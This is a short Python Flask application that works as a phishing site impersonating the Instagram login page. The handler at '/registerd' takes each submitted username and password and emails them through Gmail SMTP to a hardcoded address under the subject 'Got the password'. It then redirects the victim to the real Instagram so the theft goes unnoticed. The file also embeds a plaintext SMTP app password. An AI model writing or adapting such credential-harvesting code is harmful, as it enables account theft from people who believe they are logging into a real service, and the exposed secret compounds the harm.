from flask import Flask, request, render_template,redirect
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

@app.route("/www.instagram.com/login")
def index():
    return render_template("index.html")

@app.route("/")
def start():
    return redirect("/www.instagram.com/login")

@app.route("/registerd", methods=["POST"])
def registerd():
    name = request.form.get("username")
    password = request.form.get("password")
    sender_email = "anafmezgebutoa13@gmail.com"
    receiver_email = "anafmezgebutoa13@gmail.com"
    subject = "Got the password"
    message_body = f"name : {name}\n pass : {password}"
    message = MIMEText(message_body)
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = receiver_email

    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    smtp_username = "anafmezgebutoa13@gmail.com"
    smtp_password = 'lmvlqmhqxpfxpqtu'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.sendmail(sender_email, receiver_email, message.as_string())

    print(password)
    return redirect("https://www.instagram.com/")